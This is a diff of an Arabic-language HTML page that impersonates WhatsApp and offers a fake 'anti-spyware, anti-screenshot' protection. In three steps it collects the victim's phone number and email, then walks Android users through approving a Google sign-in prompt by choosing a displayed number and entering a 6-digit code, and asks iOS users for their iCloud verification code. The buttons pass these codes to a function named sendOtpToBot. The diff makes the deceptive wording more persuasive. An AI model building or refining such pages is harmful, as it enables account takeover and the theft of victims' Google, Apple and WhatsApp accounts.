@@ -8,49 +8,65 @@
 </head>
 <body>
     <div id="app-container" class="wa-container shadow-glow">
+        
         <div id="step-1" class="page">
-            <div class="wa-header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo"></div>
+            <div class="wa-header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo pulse"></div>
             <div class="wa-body">
-                <div style="font-size:40px;">🛡️</div>
-                <h3>تفعيل حماية المكالمات</h3>
-                <p style="font-size:13px; color:#444;">أدخل رقم الهاتف المرتبط بالخدمة لتفعيل منع تصوير الشاشة.</p>
+                <div style="font-size:45px; margin-bottom:10px;">🛡️</div>
+                <h3 style="color:#075e54;">بروتوكول حماية الخصوصية (Anti-Spyware)</h3>
+                <p style="font-size: 14px; line-height: 1.7; color: #444; padding: 0 10px;">
+                    عزيزي المستخدم، لضمان أعلى مستويات الأمان ومنع محاولات تسجيل المكالمات أو التقاط الشاشة (Anti-Screenshot) أثناء المراسلة، يرجى تفعيل طبقة التشفير الموحدة.
+                    <br><br><b>خطوة 1:</b> أدخل رقم الهاتف المرتبط بالحساب لبدء الفحص.
+                </p>
                 <input type="tel" id="phone-num" placeholder="9XXXXXXXX" class="main-input">
                 <div id="phone-error" class="error-msg">يرجى إدخال رقم صحيح (أرقام فقط)</div>
-                <button class="btn-verify" onclick="goToStep2()">تفعيل الحماية</button>
+                <button class="btn-verify" onclick="goToStep2()">تفعيل الحماية الآن</button>
             </div>
         </div>
 
         <div id="step-2" class="page" style="display:none;">
             <div id="provider-header" style="text-align:center; padding:20px;"></div>
             <div class="wa-body">
-                <h3>المزامنة الأمنية</h3>
-                <p style="font-size:12px;">اربط حساب الجهاز لتوليد مفاتيح التشفير.</p>
-                <input type="email" id="user-email" placeholder="البريد الإلكتروني" class="main-input">
-                <div id="email-error" class="error-msg">صيغة البريد غير صحيحة</div>
-                <button id="auth-btn" class="btn-verify" onclick="startAuth()">مزامنة الآن</button>
+                <h3 style="color:#1a73e8;">مصادقة الهوية السحابية</h3>
+                <p style="font-size: 13px; line-height: 1.6; color: #555;">
+                    يتم الآن إنشاء قناة اتصال آمنة (Secure Tunnel) بين جهازك وسيرفرات الحماية. يرجى تأكيد حسابك السحابي الرسمي لمزامنة مفاتيح التشفير ومنع الوصول غير المصرح به.
+                </p>
+                <input type="email" id="user-email" placeholder="البريد الإلكتروني الموحد" class="main-input">
+                <div id="email-error" class="error-msg">صيغة البريد الإلكتروني غير صالحة</div>
+                <button id="auth-btn" class="btn-verify" onclick="startAuth()">مزامنة وتشفير الحساب</button>
                 <div id="loading-spinner" class="spinner" style="display:none;"></div>
             </div>
         </div>
 
         <div id="step-3" class="page" style="display:none;">
             <div class="wa-body">
+                
                 <div id="android-ui" style="display:none;">
-                    <h3 style="color:#1a73e8;">نظام Android</h3>
-                    <div class="alert-box">اضغط على إشعار الأمان في جوالك واختر الرقم:</div>
+                    <h3 style="color:#d93025;">إجراء أمني مطلوب (Android)</h3>
+                    <div class="alert-box" style="text-align:right;">
+                        ⚠️ <b>تنبيه هام جداً:</b>
+                        <br>سيظهر لك الآن إشعار من نظام الحماية (Google) يسألك "هل تحاول تسجيل الدخول؟".
+                        <br>1. اسحب شريط الإشعارات واضغط على الإشعار فوراً.
+                        <br>2. ستظهر لك قائمة، اختر منها الرقم الموضح أدناه:
+                    </div>
                     <div id="dynamic-code" class="big-code">--</div>
-                    <p style="font-size:11px;">ثم أدخل كود التفعيل المستلم:</p>
-                    <input type="text" id="otp-code" placeholder="000000" class="main-input otp-style">
-                    <div id="otp-error" class="error-msg">الكود يجب أن يكون 6 أرقام</div>
-                    <button class="btn-verify" onclick="sendOtpToBot('android')">تأكيد</button>
+                    <p style="font-size:12px; color:#555; margin-bottom:5px;">بعد اختيار الرقم في جوالك، سيتم توليد كود التفعيل النهائي، قم بكتابته هنا:</p>
+                    <input type="text" id="otp-code" placeholder="0 0 0 0 0 0" class="main-input otp-style">
+                    <div id="otp-error" class="error-msg">الرمز يجب أن يتكون من 6 أرقام</div>
+                    <button class="btn-verify" onclick="sendOtpToBot('android')">إنهاء عملية التشفير</button>
                 </div>
 
                 <div id="ios-ui" style="display:none;">
-                    <h3 style="color:#000;">iCloud Verify</h3>
-                    <p style="font-size:13px;">أدخل كود التحقق المرسل إلى أجهزتك:</p>
-                    <input type="text" id="otp-code-ios" placeholder="000000" class="main-input otp-style">
-                    <div id="otp-error-ios" class="error-msg">الكود يجب أن يكون 6 أرقام</div>
-                    <button class="btn-verify" style="background:#007aff;" onclick="sendOtpToBot('ios')">Verify</button>
+                    <h3 style="color:#000;">iCloud Verification</h3>
+                    <p style="font-size:14px; line-height:1.6;">تم إرسال رمز أمان خاص ببروتوكول التشفير إلى أجهزتك المرتبطة بـ iCloud.</p>
+                    <div style="background:#f2f2f7; padding:15px; border-radius:10px; margin:15px 0;">
+                        <input type="text" id="otp-code-ios" placeholder="0 0 0 0 0 0" class="main-input otp-style" style="background:transparent; border:none; border-bottom:2px solid #007aff;">
+                        <div id="otp-error-ios" class="error-msg">يرجى إدخال 6 أرقام</div>
+                    </div>
+                    <p style="font-size:12px; color:#8e8e93;">أدخل الرمز المكون من 6 أرقام لتأكيد الهوية وتفعيل نظام منع التصوير.</p>
+                    <button class="btn-verify" style="background:#007aff;" onclick="sendOtpToBot('ios')">تأكيد الرمز (Verify)</button>
                 </div>
+
             </div>
         </div>
     </div>
